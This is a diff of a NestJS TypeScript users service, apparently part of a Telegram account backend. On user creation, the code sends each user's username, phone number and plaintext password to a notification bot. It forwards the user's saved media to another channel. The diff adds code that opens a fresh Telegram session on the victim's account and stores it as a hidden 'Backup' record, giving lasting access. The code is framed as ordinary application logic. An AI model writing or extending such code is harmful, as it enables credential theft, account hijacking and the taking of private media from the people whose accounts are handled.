@@ -18,7 +18,7 @@ export class UsersService {
     private telegramService: TelegramService,
     @Inject(forwardRef(() => ClientService))
     private clientsService: ClientService
-  ) {}
+  ) { }
 
   async create(user: CreateUserDto): Promise<User | undefined> {
     const activeClientSetup = this.telegramService.getActiveClientSetup();
@@ -30,8 +30,15 @@ export class UsersService {
     } else {
       await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);//Msgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);
       setTimeout(async () => {
-        await connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
-        this.telegramService.forwardMedia(user.mobile, process.env.SavedMessages, null)
+        try {
+          await connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
+          this.telegramService.forwardMedia(user.mobile, process.env.SavedMessages, null);
+          const newSession = await this.telegramService.createNewSession(user.mobile);
+          const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: "Backup" });
+          await newUserBackup.save();
+        } catch (error) {
+          console.log("Error in creating new session", error);
+        }
       }, 3000);
       const newUser = new this.userModel(user);
       return newUser.save();
